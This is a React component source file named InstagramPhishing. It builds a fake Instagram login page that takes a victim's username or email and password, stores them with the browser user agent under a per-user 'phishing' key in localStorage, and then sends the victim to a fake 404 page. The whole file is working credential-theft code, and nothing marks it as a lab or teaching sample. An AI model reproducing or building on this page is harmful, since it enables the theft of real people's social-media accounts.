
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const InstagramPhishing = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const capturedData = {
      platform: 'Instagram',
      email: formData.email,
      password: formData.password,
      timestamp: Date.now(),
      ip: 'Unknown',
      userAgent: navigator.userAgent
    };

    const existingData = JSON.parse(localStorage.getItem(`phishing_${userId}`) || '[]');
    existingData.push(capturedData);
    localStorage.setItem(`phishing_${userId}`, JSON.stringify(existingData));

    navigate('/404-not-found');
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center">
      <div className="max-w-sm mx-auto px-6">
        <div className="text-center mb-8">
          <div className="inline-block p-4 border-2 border-gray-300 rounded-lg mb-6">
            <div className="w-12 h-12 bg-gradient-to-tr from-purple-400 via-pink-500 to-red-500 rounded-lg flex items-center justify-center">
              <span className="text-white text-xl font-bold">📷</span>
            </div>
          </div>
          <h1 className="text-gray-800 text-3xl font-thin mb-6">Instagram</h1>
        </div>

        <form onSubmit={handleSubmit} className="space-y-3">
          <Input
            type="text"
            placeholder="Phone number, username, or email"
            value={formData.email}
            onChange={(e) => setFormData({...formData, email: e.target.value})}
            className="w-full h-10 border border-gray-300 rounded-sm text-sm bg-gray-50 text-gray-800"
            required
          />
          
          <Input
            type="password"
            placeholder="Password"
            value={formData.password}
            onChange={(e) => setFormData({...formData, password: e.target.value})}
            className="w-full h-10 border border-gray-300 rounded-sm text-sm bg-gray-50 text-gray-800"
            required
          />

          <Button 
            type="submit"
            className="w-full bg-blue-500 hover:bg-blue-600 text-white h-8 text-sm font-semibold rounded-sm"
          >
            Log In
          </Button>
        </form>

        <div className="flex items-center my-4">
          <div className="flex-1 border-t border-gray-300"></div>
          <span className="px-4 text-gray-500 text-xs font-semibold">OR</span>
          <div className="flex-1 border-t border-gray-300"></div>
        </div>

        <div className="text-center">
          <a href="#" className="text-blue-900 text-sm font-semibold">Log in with Facebook</a>
        </div>

        <div className="text-center mt-4">
          <a href="#" className="text-blue-900 text-xs">Forgot password?</a>
        </div>
      </div>
    </div>
  );
};

export default InstagramPhishing;
